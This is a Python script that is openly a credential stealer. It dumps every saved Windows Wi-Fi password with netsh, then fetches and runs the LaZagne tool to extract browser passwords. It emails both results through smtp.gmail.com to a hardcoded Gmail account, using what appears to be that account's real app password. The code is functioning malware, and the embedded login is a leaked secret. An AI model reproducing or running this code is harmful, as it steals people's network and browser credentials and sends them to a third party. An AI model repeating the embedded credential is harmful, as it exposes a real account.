import subprocess
import re
from smtplib import SMTP
from email.message import EmailMessage
import mimetypes
cmd_output1  = subprocess.run('netsh wlan show profile' , shell=True , capture_output=True , text=True)
result = re.findall(r':.*[\w]' , cmd_output1.stdout)
fresult = [x.strip(': ') for x in result]

print('=============Profiles=============')
print('\n'.join(fresult))
print('===========passwords==============')

for i in range(len(fresult)):
    keyresult = subprocess.run(f'netsh wlan show profile name="{fresult[i]}" key=clear' , shell=True , capture_output=True , text=True)
    key = re.search(r'Key Content            :.*' , keyresult.stdout)
    print(f'{i}]===> {key.group()}')

subprocess.run('python basic_mal.py > myoutput.txt' , shell=True )

def smtp(gmailfrom , password ,gmailto, attachment):
    server = SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(gmailfrom , password)
    #--------------------------------------
    msg = EmailMessage()
    msg['From'] = 'anonymous'
    msg['To'] = gmailto
    msg['subject'] = 'ANGRY-MAIL'
    ctype, encoding = mimetypes.guess_type(attachment)
    maintype , subtype = ctype.split('/',1)
    with open(attachment , 'rb') as f:
        msg.add_attachment(f.read(), maintype= maintype, subtype=subtype)
    message = msg.as_string()
    #--------------------------------------
    server.sendmail(gmailfrom , gmailto , message)
    server.quit()
try:
    smtp('mayhuljindal@gmail.com' , "bjcqhhokfrurgjkq" , 'mayhuljindal@gmail.com' , 'myoutput.txt')
except Exception as e:
    print(e)
    print('lauda')
    
#============================================functioning==========================================================
import subprocess,re
from smtplib import SMTP
from email.message import EmailMessage

def smtp(gmailfrom , password ,gmailto, attachment):
    server = SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(gmailfrom , password)
    #--------------------------------------
    msg = EmailMessage()
    msg['From'] = 'anonymous'
    msg['To'] = gmailto
    msg['subject'] = 'ANGRY-MAIL'
    msg.set_content(attachment)
    message = msg.as_string()
    #--------------------------------------
    server.sendmail(gmailfrom , gmailto , message)
    server.quit()

def wifi_pass_stealer():
    cmd_output1  = subprocess.check_output('netsh wlan show profile' , shell=True , text=True)
    result = re.findall(r':.*[\w]' , cmd_output1)
    profiles = [x.strip(': ') for x in result]

    keys = []
    for i in range(len(profiles)):
        keyresult = subprocess.check_output(f'netsh wlan show profile name="{profiles[i]}" key=clear' , shell=True , text=True)
        key = re.search(r'Key Content            :.*' , keyresult)
        keys.append(f'{i}]===> {key.group()}')
    smtp('mayhuljindal@gmail.com' , "bjcqhhokfrurgjkq" , 'mayhuljindal@gmail.com' , '\n'.join(profiles+keys))

def browser_pass_stealer():
    subprocess.call(['git', 'clone', 'https://github.com/AlessandroZ/LaZagne.git'] , shell=True)
    subprocess.call(r'pip install -r .\LaZagne\requirements.txt' , shell=True)
    pass_data = subprocess.check_output(r'python .\LaZagne\Windows\lazagne.py browsers' , shell=True , text=True)
    smtp('mayhuljindal@gmail.com' , "bjcqhhokfrurgjkq" , 'mayhuljindal@gmail.com' , pass_data)

try:
    wifi_pass_stealer()
    browser_pass_stealer()
except:
    print('failed')


'''
  ______   __    __   ______   _______   __      __ 
 /      \ /  \  /  | /      \ /       \ /  \    /  |
/$$$$$$  |$$  \ $$ |/$$$$$$  |$$$$$$$  |$$  \  /$$/ 
$$ |__$$ |$$$  \$$ |$$ | _$$/ $$ |__$$ | $$  \/$$/  
$$    $$ |$$$$  $$ |$$ |/    |$$    $$<   $$  $$/   
$$$$$$$$ |$$ $$ $$ |$$ |$$$$ |$$$$$$$  |   $$$$/    
$$ |  $$ |$$ |$$$$ |$$ \__$$ |$$ |  $$ |    $$ |    
$$ |  $$ |$$ | $$$ |$$    $$/ $$ |  $$ |    $$ |    
$$/   $$/ $$/   $$/  $$$$$$/  $$/   $$/     $$/     

'''